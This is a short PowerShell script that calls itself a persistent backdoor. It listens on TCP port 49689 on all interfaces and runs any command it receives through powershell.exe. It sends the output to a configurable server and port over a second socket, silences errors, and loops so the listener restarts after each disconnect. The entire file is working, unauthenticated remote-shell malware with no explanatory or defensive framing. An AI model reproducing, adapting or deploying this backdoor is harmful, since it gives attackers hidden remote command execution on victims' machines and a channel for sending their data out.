#Semi-custom made, persistent backdoor. Gives user a powershell shell. Will listen on $Port and send the output of all commands to $ServerAddr:$ServerPort.

function Execute-This($inputCommand) {		#Send commands' outputs back on a separate socket
	$ErrorActionPreference = 'silentlycontinue'
	$ServerAddr = "127.0.0.1"
	$ServerPort = "443"
	$tcpConnection = New-Object System.Net.Sockets.TcpClient($ServerAddr, $ServerPort)

	$tcpStream = $tcpConnection.GetStream()
	$reader = New-Object System.IO.StreamReader($tcpStream)
	$writer = New-Object System.IO.StreamWriter($tcpStream)
	$writer.AutoFlush = $true

	while ($tcpStream.DataAvailable) {
		$reader.ReadLine()
	}

	if ($tcpConnection.Connected) {
		$writer.WriteLine($inputCommand)
	}

	$reader.Close()
	$writer.Close()
	$tcpConnection.Close()
}

$Port = 49689

#The loop keeps the listener persistent after a user closes the connection.
while ($true) {

	# Set up endpoint and start listening
	$endpoint = new-object System.Net.IPEndPoint([ipaddress]::any,$port) 
	$listener = new-object System.Net.Sockets.TcpListener $EndPoint
	$listener.start() 

	# Wait for an incoming connection 
	$data = $listener.AcceptTcpClient() 

	# Stream setup
	$stream = $data.GetStream() 
	$bytes = New-Object System.Byte[] 1024
	Try {
		# Read data from stream and write it to host
		while (($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
			$EncodedText = New-Object System.Text.ASCIIEncoding
			$data = $EncodedText.GetString($bytes,0, $i)
			$storageData = powershell.exe $data | Out-String
			Execute-This($storageData)
		}
	} Catch {
		#Do nothing
	}		

	# Close TCP connection and stop listening
	$stream.close()
	$listener.stop()
}